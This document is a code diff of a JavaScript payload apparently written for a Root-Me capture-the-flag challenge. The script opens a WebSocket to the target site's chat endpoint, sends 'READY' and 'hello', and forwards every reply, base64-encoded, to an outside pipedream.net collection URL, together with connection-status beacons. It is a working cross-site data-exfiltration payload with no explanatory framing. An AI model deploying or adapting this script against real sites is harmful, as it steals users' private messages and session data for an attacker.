@@ -1,8 +1,12 @@
 <script>
-    let v = open("http://ctf15.root-me.org/room");
     fetch('https://eocvkn4m3kpce3q.m.pipedream.net?cyka', {mode: 'no-cors'});
-    try {
-      setTimeout(() => {
+    //websocket available
+    window.WebSocket = window.WebSocket || window.MozWebSocket;
+    if (!window.WebSocket) {
+        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?noWS', {mode: 'no-cors'});
+    }
+
+    //launch connection
     var websocket = new WebSocket('ws://ctf15.root-me.org/ws');
     websocket.onopen = start;
       websocket.onmessage = handleReply;
@@ -11,22 +15,15 @@
           location.reload()
         };
         websocket.onclose = function(message) {
-            fetch('https://eocvkn4m3kpce3q.m.pipedream.net?message='+message, {mode: 'no-cors'});
+            fetch('https://eocvkn4m3kpce3q.m.pipedream.net?close='+message, {mode: 'no-cors'});
         }
     
       function start(event) {
+          //try to thing: retrieving the previous conv and retrieving the hello result
           websocket.send("READY");
         websocket.send("hello");
       }
       function handleReply(event) {
         fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+btoa(event.data), {mode: 'no-cors'})
       }
-
-    }, 1000)
-}
-catch (e) {
-    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?error='+e, {mode: 'no-cors'});
-}
-
-
 </script>
